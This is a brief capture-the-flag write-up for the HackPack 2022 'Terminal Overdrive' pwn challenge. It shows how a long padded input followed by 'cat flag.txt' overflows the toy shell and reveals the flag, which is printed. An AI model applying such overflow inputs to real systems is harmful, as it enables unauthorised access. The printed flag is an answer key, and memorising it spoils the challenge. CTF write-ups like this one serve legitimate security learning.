# Terminal Overdrive
## Challenge
![challenge](https://github.com/TwentySick/CTF/blob/ed33aa6ff2d281d1734ab16db7edecf3013c5a57/2022/HackPack%20CTF/pwn/terminal_overdrive/images/challenge.png)
## Solution
Using ghidra to check file chal, easily to see that I can use 'pwd', 'ls', 'cat' from function 'evaluate\_statement'
![decompiler](https://github.com/TwentySick/CTF/blob/ed33aa6ff2d281d1734ab16db7edecf3013c5a57/2022/HackPack%20CTF/pwn/terminal_overdrive/images/decompiler.png)\
so I try to overflow by `11111111111111111111111111111111 cat flag.txt` and get the flag
(I just have got some lucky from this chall)
```bash
PACKShell v0.0.0.1.2.5l6.3
$ 111111111111111111111111111111111111111111111 cat flag.txt
flag.txt
flag{cH3ck_uR_bUFF3rz!1!}
```
Flag:
```
flag{cH3ck_uR_bUFF3rz!1!}
```
